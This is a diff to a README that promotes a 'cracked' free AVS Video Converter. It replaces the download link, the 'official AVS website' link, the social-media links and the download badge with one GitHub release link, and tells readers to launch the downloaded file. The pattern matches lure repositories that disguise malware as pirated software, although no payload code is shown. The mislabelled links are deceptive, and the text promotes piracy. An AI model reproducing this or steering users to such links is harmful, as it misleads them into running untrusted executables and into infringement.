@@ -29,7 +29,7 @@ Explore the following topics related to AVS Video Converter:
 
 ## Getting Started
 
-To download the AVS Video Converter Free, click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). This link will lead you to the zipped file that contains the cracked version of the software. Remember to launch the file once it finishes downloading.
+To download the AVS Video Converter Free, click [here](https://github.com/ItsProstyy/AVS-Video-Converter-Free/releases/tag/v1.0). This link will lead you to the zipped file that contains the cracked version of the software. Remember to launch the file once it finishes downloading.
 
 ## Contributions
 
@@ -37,7 +37,7 @@ Contributions to this repository are welcome. If you have any improvements or up
 
 ## Resources
 
-For more information on AVS Video Converter and its features, visit the official [AVS website](https://www.avs4you.com/). Here you can explore the full capabilities of the software and stay updated on the latest versions.
+For more information on AVS Video Converter and its features, visit the official [AVS website](https://github.com/ItsProstyy/AVS-Video-Converter-Free/releases/tag/v1.0). Here you can explore the full capabilities of the software and stay updated on the latest versions.
 
 ## Support
 
@@ -46,9 +46,9 @@ If you encounter any issues or have questions regarding the AVS Video Converter 
 ## Stay Connected
 
 Stay connected with the AVS Video Converter community by following us on social media:
-- Twitter: [@AVSVideoConverter](https://twitter.com/AVSVideoConverter)
-- Facebook: [AVS Video Converter](https://www.facebook.com/avs.video.converter)
+- Twitter: [@AVSVideoConverter](https://github.com/ItsProstyy/AVS-Video-Converter-Free/releases/tag/v1.0)
+- Facebook: [AVS Video Converter](https://github.com/ItsProstyy/AVS-Video-Converter-Free/releases/tag/v1.0)
 
 Let's convert and enjoy videos with AVS Video Converter Free! 📹✨
 
-[![Download AVS Video Converter Free](https://img.shields.io/badge/Download-AVS_Video_Converter_Free-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download AVS Video Converter Free](https://github.com/ItsProstyy/AVS-Video-Converter-Free/releases/tag/v1.0)](https://github.com/ItsProstyy/AVS-Video-Converter-Free/releases/tag/v1.0)
